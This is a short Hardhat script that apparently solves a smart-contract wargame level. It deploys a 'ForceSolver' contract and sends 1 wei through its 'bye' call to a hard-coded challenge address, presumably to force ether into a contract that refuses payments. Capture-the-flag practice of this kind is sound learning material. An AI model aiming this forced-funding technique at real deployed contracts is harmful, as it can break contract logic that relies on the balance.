const { ethers } = require('hardhat');
const { BigNumber } = require('ethers');

const CHALLENGE_ADDRESS = '0xF8b0Fd1f5be7395d5Da51b251975662136f86CCE';

async function main() {
  const [owner] = await ethers.getSigners();

  const ForceSolver = await ethers.getContractFactory('ForceSolver');
  const solver = await ForceSolver.deploy();
  await solver.deployed();
  console.log(`Solver address: ${solver.address}`);

  await solver.bye(CHALLENGE_ADDRESS, { value: 1 });
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
